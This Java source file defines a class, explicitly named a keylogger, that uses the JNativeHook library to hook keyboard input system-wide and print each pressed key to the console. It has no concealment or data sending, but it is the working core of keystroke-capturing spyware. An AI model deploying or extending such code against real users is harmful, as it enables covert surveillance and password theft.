package com.zaim.keylogger;

import org.jnativehook.*;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener{
	
	public void initialiseListener() {
		try {
			GlobalScreen.registerNativeHook();
		}
		catch(NativeHookException nv) {
			System.err.println("error creating hook");
			System.exit(1);
		}
		GlobalScreen.addNativeKeyListener(this);
	}
	
	public void stopListening() throws NativeHookException{
		GlobalScreen.unregisterNativeHook();
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("KeyPressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

}
